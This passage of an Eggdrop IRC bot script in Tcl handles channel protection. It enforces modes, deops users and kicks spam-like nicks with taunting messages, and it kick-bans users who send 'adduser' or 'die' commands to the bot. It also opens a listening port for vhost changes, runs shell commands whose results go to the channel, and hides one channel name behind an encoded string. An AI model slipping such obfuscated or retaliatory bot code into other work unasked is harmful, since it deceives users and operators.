putserv "mode $channel -k 9r.e.l.e.a.s.e.d"
}
}
}
if {[string match "*R*" $cmode]} {
if {[string tolower $channel] != [dezip [lines "9MJu6/A2i8/0"]]} {
puthelp "mode $channel -R"
}
}
if {[string match "*m*" $cmode] && ![string match "*m*" [lindex [channel info $channel] 0]]} {
putserv "mode $channel -m"
}
if {[string match "*i*" $cmode]} {
putserv "mode $channel -i"
}
}
if {![string match "*m*" $cmode]} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x]} {
killutimer [lindex $x 2]
}
}
}
if {[matchattr $cflag I]} {
if {[topic $channel] != [getuser $cflag XTRA "TOPIC"]} {
puthlp "topic $channel :[getuser $cflag XTRA "TOPIC"]"
}
}
foreach x [chanlist $channel] {
if {$x == $deopme} {
if {[isop $x $channel]} {
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -ko 4De@p.ReveRsE $x"
} else {
putserv "mode $channel -ko 4De@p.ReveRsE $x"
}
} {
if {$quick == "1"} {
putquick "mode $channel -o $x"
} else {
putserv "mode $channel -o $x"
}
}
}
set deopme ""
}
set mhost "@[lindex [split [getchanhost $x $channel] @] 1]"
if {[info exists kickme($x)]} {
if {$kickme($x) == 3} {
catch { unset kickme($x) }
set bannick($x) "*!*$mhost"
if {$quick == "1"} {
putqck "KICK $channel $x :$notc 1RePeaT 4KIcK 1ReMoTe OFF4..! [banmsg]"
} else {
putsrv "KICK $channel $x :$notc 1RePeaT 4KIcK 1ReMoTe OFF4..! [banmsg]"
}
} {
if {$kickme($x) == 1} {
if {$quick == "1"} {
putqck "KICK $channel $x :$notc 1SeLF 4KIcK1 REvENgE4..! [banmsg]"
} {
putsrv "KICK $channel $x :$notc 1SeLF 4KIcK1 REvENgE4..! [banmsg]"
}
}
}
}
if {[string match "*+guest*" [channel info $channel]]} {
neww:talk $x [getchanhost $x $channel] $channel
}
if {[string match "*+trojan*" [channel info $channel]]} {
set bmask_check $x!$uhost
set bmask_host "*!*@[lindex [split $uhost @] 1]"
trojanchk $x $bmask_check $bmask_host $channel
}
if {[matchattr $cflag V]} {
if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
set cret [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
} }
}
utimer $cret [list voiceq $channel $x]
}
}
}
if {[matchattr $x v] || [matchattr $x P] || [matchattr $x G]} {
if {![isop $x $channel] || ![isvoice $x $channel]} {
whoisq $x
}
}
if {[matchattr $x O]} {
if {[isop $x $channel]} {
set cmode [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -ko 4No@p.LIsT $x"
} {
puthelp "mode $channel -o $x"
}
} {
if {[isvoice $x $channel]} {
set cmode [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kv 4No@p.LIsT $x"
} {
puthelp "mode $channel -v $x"
}
}
}
}
if {[info exists invme($mhost)]} {
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
if {$invme($mhost) == "AuToJoIN MSg"} {
if {![isvoice $x $channel]} {
putsrv "KICK $channel $x :$notc !4Sp&#226;4M!10 FRoM 4$mhost 1$invme($mhost) 4R1emote 4O1ff4..! [banmsg]"
}
} {
putsrv "KICK $channel $x :$notc !4Sp&#226;4M!10 FRoM 4$mhost 1$invme($mhost) [banmsg]"
}
}
catch {unset invme($mhost)}
}
if {$x == $virus_nick} {
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
putsrv "KICK $channel $x :$notc !4Sp&#226;4M!10 FRoM 4$mhost1 VIRuZ [banmsg]"
set virus_nick ""
}
}
spam_chk $x [getchanhost $x $channel] "*" $channel
}
foreach x [chanlist $channel K] {
if {![matchattr $x f]} {
akick_chk $x [getchanhost $x $channel] $channel
}
}
foreach x [chanbans $channel] {
set bhost [lindex $x 0]
if {[string match [string tolower $bhost] [string tolower $botname]]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4SeLF.UnBaN $bhost"
} {
puthelp "mode $channel -b $bhost"
}
} elseif {[matchattr $bhost f]} {
puthelp "mode $channel -b $bhost"
} elseif {[getuser "config" XTRA "IPG"] != ""} {
foreach ipg [getuser "config" XTRA "IPG"] {
if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
if {![isutimer "IPG $bhost"]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4IpgUaRd $bhost"
} {
puthelp "mode $channel -b $bhost"
}
utimer 60 [list putlog "IPG $bhost"]
}
}
}
}
}
}
bind time -  "01 * * * *" show_status
proc show_status {min h d m y} {
global botnick
foreach x [channels] {
if {[botisop $x]} {
pub_status "*" "*" "*" $x ""
chk_on_op $x
}
}
return 0
}
proc badnick_chk {nick uhost hand chan} {
global bannick notc botnick badwords
foreach x [string tolower $badwords] {
if {[string match "*$x*" [string tolower $nick]]} {
set bannick($nick) "*!$uhost"
putsrv "KICK $chan $nick :$notc 4BaD NIcK1 MaTcH FRoM 4[string toupper $x] [banms]"
return 1
}
}
return 0
}
proc spam_chk {nick uhost hand chan} {
global notc botnick spidx
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $cflag S]} { return 0 }
if {$nick == $botnick} { return 0 }
if {[isvoice $nick $chan]} { return 0 }
if {[isop $nick $chan]} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[badnick_chk $nick $uhost $hand $chan]} {
return 0
}
set nicklen [string length $nick]
if {$nicklen < 5} { return 0 }
set idx [string index $nick [expr $nicklen - 4]][string index $nick [expr $nicklen - 3]][string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
if {[isnumber $idx]} { return 0 }
set idx [string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
if {[isnumber $idx]} {
if {[string index $uhost 0] != "~"} { return 0 }
if {$nicklen < 10} {
if {![string match "~$nick@*" $uhost]} { return 0 }
} {
if {![string match "~[string index $nick 0][string index $nick 1][string index $nick 2]*@*" $uhost]} { return 0 }
}
if {$spidx == 18} {
set spidx 1
}
spamkick $nick $uhost $chan
return 0
}
if {[regexp \[^a-z\] $nick]} { return 0 }
set nickchk [string tolower $nick]
set count 0
set lstidx ""
for {set i 0} {$i < $nicklen} {incr i} {
set idx [string index $nickchk $i]
if {$idx == "a" || $idx == "e" || $idx == "i" || $idx == "o" || $idx == "u"} {
set count 0
} {
if {$idx != $lstidx && $idx != "y"} { incr count }
if {$count == 4} {
spamkick $nick $uhost $chan
return 0
}
}
set lstidx $idx
}
}
proc akick_chk {nick uhost chan} {
global notc bannick
foreach x [getuser "AKICK" HOSTS] {
if {[string match [string tolower $x] [string tolower "$nick!$uhost"]]} {
set bannick($nick) $x
putsrv "KICK $chan $nick :$notc 4B1L4a1c4K1L4I1s4T1 MaTcH FRoM4 $x [banms]"
return 0
}
}
}
set spidx 1
proc spamkick {nick uhost chan} {
global spidx notc bannick
set mhost [string range $uhost [string first "@" $uhost] end]
set bannick($nick) "*!*$mhost"
if {$spidx == 1} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 YeW AInT WeLcOmE In 4[string toupper $chan] [banms]"
} elseif {$spidx == 2} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 DRonE TRoJaN [banmsg]"
} elseif {$spidx == 3} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 UgH I HatE ThIs NIcK [banmsg]"
} elseif {$spidx == 4} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 Ups WRoNg WaY [banmsg]"
} elseif {$spidx == 5} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 DonT EnTeReD 4[string toupper $chan] [banms]"
} elseif {$spidx == 6} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 InTeRcEpT [banmsg]"
} elseif {$spidx == 7} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 G.o.T.c.H.a [banmsg]"
} elseif {$spidx == 8} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 NEgaTIvE HoUsToN [banmsg]"
} elseif {$spidx == 9} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 gRoUndEd [banmsg]"
} elseif {$spidx == 10} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 AnTIcIpaTEd [banmsg]"
} elseif {$spidx == 11} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 gO sIt In tHe cOrNeR [banmsg]"
} elseif {$spidx == 12} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 b.l.a.c.k.l.i.s.t.e.d [banmsg]"
} elseif {$spidx == 13} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 ReJecTed FRoM 4[string toupper $chan] [banms]"
} elseif {$spidx == 14} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 sMoosHINg ReLaY TaBLe [banmsg]"
} elseif {$spidx == 15} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 dUn EnTeRed oNe oF mY cHanneL [banmsg]"
} elseif {$spidx == 16} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 ReFusEd LInK tO 4[string toupper $chan] [banms]"
} elseif {$spidx == 17} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 FakE NIcKNaMe [banmsg]"
} elseif {$spidx >= 18} {
putsrv "KICK $chan $nick :$notc !4Sp&#226;4M!10 Unable to resolve4 $nick [banms]"
set spidx 0
}
incr spidx
return 0
}
proc isutimer {text} {
set text [string tolower $text]
foreach x [utimers] {
set x [string tolower $x]
if {[string match "*$text*" $x]} {  return 1
break
}
}
return 0
}
proc istimer {text} {
set text [string tolower $text]
foreach x [timers] {
set x [string tolower $x]
if {[string match "*$text*" $x]} {
return 1
break
}
}
return 0
}
catch { set old_hostname ${my-hostname} }
catch { set old_ip ${my-ip} }
bind msg Z vhost msg_vhost
proc msg_vhost {nick uhost hand rest} {
global my-hostname my-ip notc
if {$rest == ""} {
puthlp "NOTICE $nick :$notc ReSET TO DeFauLT"
setuser "config" XTRA "VHOST" ""
saveuser
vback "*" "*" "0"
return 0
}
for {set i 0} {$i < [string length $rest]} {incr i} {
set idx [string index $rest $i]
if {![string match "*$idx*" "1234567890."]} {
puthlp "NOTICE $nick :$notc UsE DNS IP NuMBeR"
return 0
}
}
if {[isutimer "vback"]} {
puthlp "NOTICE $nick :$notc WaIT..!"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set my-hostname $rest
set my-ip $rest
utimer 30 [list vback $nick $rest "1"]
listen 65234 bots
set idx [connect $rest 65234]
if {[isnumber $idx] && $idx > 0} {
if {![isutimer "vback"]} { return 0 }
foreach x [utimers] {
if {[string match "*vback*" $x]} { killutimer [lindex $x 2] }
}
setuser "config" XTRA "VHOST" $rest
saveuser
putsrv "QUIT :$notc cHaNgINg vHosT ReQuesT By \[ $nick \]"
}
listen 65234 off
}
bind raw - 465 klined
proc klined {from keyword arg} {
vback "*" "*" "0"
}
proc vback {nick vhosts chk} {
global old_hostname old_ip notc
set my-hostname $old_hostname
set my-ip $old_ip
if {$chk == "1"} {
puthlp "NOTICE $nick :$notc \[$vhosts\] NoT SuPPoRT..!"
}
catch { listen 65234 off }
}
proc xactr {nick uhost hand dest key couk} {
global botnick pingchan wait_ping notb basechan owner
catch {unset wait_ping}
if {$nick==$botnick} {return 0}
#set asu "#$notb"
#if {[string tolower $asu] != "#Guardian"} {return 0}
if {[string match "*a*" [string tolower $couk]] || [string match "*i*" [string tolower $couk]] || [string match "*u*" [string tolower $couk]] || [string match "*e*" [string tolower $couk]] || [string match "*o*" [string tolower $couk]]} {
foreach x [channels] {
if {[string match "*adduser*" [string tolower $couk]]} {
if {[onchan $nick $x] && [botisop $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
puthlp "KICK $x $nick :4Trying To aDduSeR??? [banmsg]"
puthlp "MODE $x +b $mhost"
}
set tukang "${nick}!*@*"
newignore $tukang $botnick "*" 60
set bos [lindex [split $couk " "] 1]
set maling [lindex [split $couk " "] 2]
putlog $maling
set maling [lindex [split $maling ";"] 0]
newignore $maling $botnick "*" 60
set tukang "${nick}!*@*"
newignore $tukang $botnick "*" 60
puthlp "PRIVMSG $basechan :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 is tRyiNg aDduSeR 14,1\[0 $bos 14\]2,0 4HanCuRkAN !!! [lgrnd]"
puthlp "PRIVMSG $owner :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 is tRyiNg aDduSeR 14,1\[0 $bos 14\]2,0 4HanCuRkAN !!! [lgrnd]"
return 0
} elseif {[string match "*die*" [string tolower $couk]]} {
if {[onchan $nick $x] && [botisop $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
puthlp "KICK $x $nick :4Trying tO kiLL mE??? [banmsg]"
puthlp "MODE $x +b $mhost"
}
set tukang "${nick}!*@*"
newignore $tukang $botnick "*" 60
puthlp "PRIVMSG $basechan :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 is tRyiNg tO kiLL mE. 4HanCuRkAN !!! [lgrnd]"
puthlp "PRIVMSG $owner :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 is tRyiNg tO kiLL mE. 4HanCuRkAN !!! [lgrnd]"
return 0
} else {
if {[onchan $nick $x] && [botisop $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
puthlp "KICK $x $nick :4tRyiNg TO HaCk mE??? [banmsg]"
puthlp "MODE $x +b $mhost"
}
set tukang "${nick}!*@*"
newignore $tukang $botnick "*" 60
puthlp "PRIVMSG $basechan :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 is tRyiNg TO HaCk mE. 4HanCuRkAN !!! [lgrnd]"
puthlp "PRIVMSG $basechan :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 is tRyiNg TO HaCk mE. 4HanCuRkAN !!! [lgrnd]"
return 0
}
}
return 0
}
if { $key != "PING" } {return 0}
set pingtime [expr [unixtime] - $couk]
if {[info exists pingchan($nick)]} {
puthlp "PRIVMSG $pingchan($nick) :$nick, PING $pingtime Sec's"
unset pingchan($nick)
}
if {![matchattr $nick f]} {
set tukang "${nick}!*@*"
putlog "!Log! 1 minutes auto ignore to $tukang"
newignore $tukang $botnick "*" 1
}
return 0
}
proc shelluptime { } {
if {[catch {exec uptime} uptime]} { set uptime "Uptime non disponible." }
if {[catch {exec uname -s} machine]} { set machine [unames] }
if {[catch {exec hostname} hostname]} { set hostname [info hostname] }
return "$hostname ($machine), Live For $uptime"
}
proc pub_status {nick uhost hand channel rest} {
global ban-time botnick own ps vern
set cflag "c$channel"
set cflag [string range $cflag 0 8]
if {$rest != ""} {
if {[validchan $rest]} {
set channel $rest
} {
return 0
}
}
set cinfo [channel info $channel]
if {![string match "*+shared*" $cinfo] && $nick == "*"} { return 0 }
set mstatus ""
set globals ""
if {[matchattr $cflag I]} { append mstatus "\[7T\]oPIcLocK " }
if {[matchattr $cflag M]} { append mstatus "FoRcE\[7M\]odE " }
if {[string match "*+nodesynch*" $cinfo]} { append mstatus "AuTo\[7K\]IcK " }
if {[string match "*-userinvites*" $cinfo]} { append mstatus "\[7D\]onTKIcK@Ps " }
if {[string match "*+protectfriends*" $cinfo]} { append mstatus "UnRE\[7@\]P " }
if {[string match "*+greet*" $cinfo]} {
set i 0
while {$i < [string length $cinfo]} {
set y 0
while {$y < [string length [lindex $cinfo $i]]} {
if {[string index [lindex $cinfo $i] $y] == ":"} { break }
set y [incr y]
}
if {$y != [string length [lindex $cinfo $i]]} { break }
set i [incr i]
}
set ichan [lindex $cinfo $i]
set ictcp [lindex $cinfo [expr $i + 1]]
set ijoin [lindex $cinfo [expr $i + 2]]
set ikick [lindex $cinfo [expr $i + 3]]
set ideop [lindex $cinfo [expr $i + 4]]
set inick [lindex $cinfo [expr $i + 5]]
if {![string match "*:*" $inick]} {
set inick "0"
}
append mstatus "\[7G\]uaRd FLoOd \[7LInE4 $ichan7 cTcP4 $ictcp7 JoIN4 $ijoin7 KIcK4 $ikick7 De@p4 $ideop7 NIcK4 $inick\] "
if {${ban-time} != 0} { append globals "\[7B\]aNTImE4 ${ban-time}7 mIn " }
}
if {[matchattr $cflag V]} { append mstatus "\[7A\]uToVoIcE4 [getuser $cflag XTRA "VC"]7 Sec's " }
if {[matchattr $cflag K]} { append mstatus "\[7K\]eY " }
if {[matchattr $cflag D]} { append mstatus "Re\[7V\]eNgE " }
if {[matchattr $cflag G]} { append mstatus "\[7G\]ReeT " }
if {[matchattr $cflag H]} { append mstatus "\[7N\]TcParT " }
if {[matchattr $cflag S]} { append mstatus "\[7S\]paM " }
if {[getuser "config" XTRA "KOPS"]!=""} { append globals "\[7@\]PSKIcK " }
if {[getuser "config" XTRA "KCOUNTER"]=="ON"} { append globals "\[7K\]IcKCouNTeR " }
if {[matchattr $cflag R]} { append mstatus "\[7R\]ePeaT4 [getuser $cflag XTRA "RPT"] " }
if {[matchattr $cflag U]} { append mstatus "\[7C\]aPs4 [getuser $cflag XTRA "CAPS"]% " }
if {[matchattr $cflag P]} { append mstatus "JoIN\[7P\]aRT4 [getuser $cflag XTRA "JP"]7 Sec's " }
if {[matchattr $cflag T]} { append mstatus "\[7T\]exT4 [getuser $cflag XTRA "CHAR"]7 CHaR " }
if {[matchattr $cflag J]} { append mstatus "MaSs\[7J\]oIN " }
if {[matchattr $cflag L]} { append mstatus "\[7L\]ImITEd4 +[getuser $cflag XTRA "LIMIT"] " }
if {[string match "*+seen*" $cinfo]} { append mstatus "\[7S\]EEN " }
if {[matchattr $cflag O]} { append mstatus "\[7C\]LonE4 [getuser $cflag XTRA "CLONE"]7 MaX " }
if {[matchattr $cflag B]} { append mstatus "\[7B\]OLd " }
if {[matchattr $cflag W]} { append mstatus "Co\[7L\]OuR " }
if {[string match "*+action*" $cinfo]} { append mstatus "\[7AC\]Tion " }
if {[string match "*+guest*" $cinfo]} { append mstatus "\[7No\]GUesT " }
if {[string match "*+trojan*" $cinfo]} { append mstatus "\[7No\]TrojaN " }
if {[string match "*+resync*" $cinfo]} { append mstatus "\[7A\]utoResync " }
if {[string match "*+noaway*" $cinfo] && [string match "*+noidle*" $cinfo] && [string match "*+unident*" $cinfo]} { append mstatus "De\[7@\]ps\(7away: 9ON7 idle:4 [getuser $cflag XTRA "NOIDLE"] 9Min's7 unident: 9ON\) " }
if {[string match "*+noaway*" $cinfo] && [string match "*+noidle*" $cinfo] && [string match "*-unident*" $cinfo]} { append mstatus "De\[7@\]ps\(7away: 9ON7 idle:4 [getuser $cflag XTRA "NOIDLE"] 9Min's7 unident: 4OFF\) " }
if {[string match "*+noaway*" $cinfo] && [string match "*-noidle*" $cinfo] && [string match "*+unident*" $cinfo]} { append mstatus "De\[7@\]ps\(7away: 9ON7 idle: 4OFF7 unident: 9ON\) " }
if {[string match "*-noaway*" $cinfo] && [string match "*+noidle*" $cinfo] && [string match "*+unident*" $cinfo]} { append mstatus "De\[7@\]ps\(7away: 4OFF7 idle:4 [getuser $cflag XTRA "NOIDLE"] 9Min's7 unident: 9ON\) " }
if {[string match "*-noaway*" $cinfo] && [string match "*-noidle*" $cinfo] && [string match "*+unident*" $cinfo]} { append mstatus "De\[7@\]ps\(7away: 4OFF7 idle: 4OFF7 unident: 9ON\) " }
if {[string match "*-noaway*" $cinfo] && [string match "*-noidle*" $cinfo] && [string match "*-unident*" $cinfo]} { append mstatus "De\[7@\]ps\(7away: 4OFF7 idle: 4OFF7 unident: 4OFF\) " }
if {[string match "*-noaway*" $cinfo] && [string match "*+noidle*" $cinfo] && [string match "*-unident*" $cinfo]} { append mstatus "De\[7@\]ps\(7away: 4OFF7 idle:4 [getuser $cflag XTRA "NOIDLE"] 9Min's7 unident: 4OFF\) " }
if {[string match "*+noaway*" $cinfo] && [string match "*-noidle*" $cinfo] && [string match "*-unident*" $cinfo]} { append mstatus "De\[7@\]ps\(7away: 9ON7 idle: 4OFF7 unident: 4OFF\) " }
if {[matchattr $cflag E]} { append mstatus "\[7E\]nFoRceBaN " }
if {[matchattr $cflag C]} { append mstatus "\[7C\]YcLE4 [getuser $cflag XTRA "CYCLE"]7 Min's " }
if {$mstatus != ""} {
set mstatus "FoR \[4[string tolower $channel]\] ${mstatus}"
}
if {$globals != ""} {
if {[getuser "config" XTRA "ADMIN"]!=""} {
set globals "${globals}[getuser "config" XTRA "ADMIN"] [lgrnd]"
} {
set globals "${globals}[lgrnd]"
}
}
set chan "0"; foreach x [channels] { incr chan }
if {[string match "*c*" [getchanmode $channel]]} {
set mstatus [uncolor $mstatus]
set globals [uncolor $globals]
regsub -all --  $mstatus "" mstatus
regsub -all --  $globals "" globals
}
puthelp "PRIVMSG $channel :\001ACTION Running with: [expr $chan - 1] channels, [countusers] users, from [shelluptime]\001"
puthelp "PRIVMSG $channel :\001ACTION Local Modes: $mstatus\001"
puthelp "PRIVMSG $channel :\001ACTION Global Modes: $globals\001"
}
proc pub_+spam {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [userlist A] {
chattr $x +S
}
puthlp "NOTICE $nick :$notc ALL SpaM CHaNNeL \[9ON\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[matchattr $cflag S]} {
puthlp "NOTICE $nick :$notc SpaM $chan \[9ON\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +S
puthlp "NOTICE $nick :$notc SpaM $chan \[9ON\]"
saveuser
}
proc pub_-spam {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [userlist A] {
chattr $x -S
}
puthlp "NOTICE $nick :$notc ALL SpaM CHaNNeL \[4OFF\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {![matchattr $cflag S]} {
puthlp "NOTICE $nick :$notc SpaM $chan \[4OFF\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -S
puthlp "NOTICE $nick :$notc SpaM $chan \[4OFF\]"
saveuser
}
proc pub_+cycle {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage +cYcLe <minutes>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick :$notc cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +C
setuser $cflag XTRA "CYCLE" $rest
puthlp "NOTICE $nick :$notc cYcLe $chan \[9$rest\] MnT"
if {![istimer "cycle $chan"]} { timer $rest [cycle $chan] }
saveuser
}
proc pub_-cycle {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -C
setuser $cflag XTRA "CYCLE" ""
puthlp "NOTICE $nick :$notc cYcLe $chan \[4OFF\]"
saveuser
foreach x [timers] {
if {[string match "*cycle $chan*" $x]} { killtimer [lindex $x 2] }
}
}
proc pub_+greet {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage +greet <msg>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +G
setuser $cflag XTRA "GREET" $rest
puthlp "NOTICE $nick :$notc AuTOGReeT $chan \[$rest\]"
saveuser
}
proc pub_-greet {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -G
setuser $cflag XTRA "GREET" ""
puthlp "NOTICE $nick :$notc AuTOGReeT $chan \[4OFF\]"
saveuser
}
proc pub_+ntcpart {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage +ntcpart <msg>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +H
setuser $cflag XTRA "MSGPART" $rest
puthlp "NOTICE $nick :$notc NotiCe PaRt $chan \[$rest\]"
saveuser
}
proc pub_-ntcpart {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -H
setuser $cflag XTRA "MSGPART" ""
puthlp "NOTICE $nick :$notc NotiCe PaRt $chan \[4OFF\]"
saveuser
}
proc pub_+limit {nick uhost hand chan rest} {
global notc
if {$rest == "" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage: +limit <number>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick :$notc cAnT UsE NuLL"
return 0
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +L
setuser $cflag XTRA "LIMIT" $rest

puthlp "NOTICE $nick :$notc LImIT $chan \[9$rest\]"
saveuser
}
proc pub_-limit {nick uhost hand chan rest} {
global notc lst_limit
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -L
setuser $cflag XTRA "LIMIT" ""
puthlp "NOTICE $nick :$notc LImIT $chan \[4OFF\]"
catch { lst_limit($chan) }
saveuser
}
proc pub_+topic {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +I
setuser $cflag XTRA "TOPIC" [topic $chan]
puthlp "NOTICE $nick :$notc TopIc $chan \[9LocK\]"
saveuser
}
proc pub_-topic {nick uhost hand chan rest} {
global notc lst_limit
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -I
setuser $cflag XTRA "TOPIC" ""
puthlp "NOTICE $nick :$notc TopIc $chan \[4UnLocK\]"
saveuser
}
proc pub_+joinpart {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage +joinpart <seconds>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick :$notc cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +P
setuser $cflag XTRA "JP" $rest
puthlp "NOTICE $nick :$notc JoINPaRT $chan \[9$rest Sec's\]"
saveuser
}
proc pub_-joinpart {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -P
setuser $cflag XTRA "JP" ""
puthlp "NOTICE $nick :$notc JoINPaRT $chan \[4OFF\]"
saveuser
}
proc pub_+clone {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage +clone <max>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick :$notc cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +O
setuser $cflag XTRA "CLONE" $rest
puthlp "NOTICE $nick :$notc cLonE $chan MaX \[9$rest\]"
saveuser
}
proc pub_-clone {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -O
setuser $cflag XTRA "CLONE" ""
puthlp "NOTICE $nick :$notc cLonE $chan \[4OFF\]"
saveuser
}
proc pub_+key {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
set rest [lindex $rest 0]
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage +key <word>"
return 0
}
chattr $cflag +K
setuser $cflag XTRA "CI" [zip $rest]
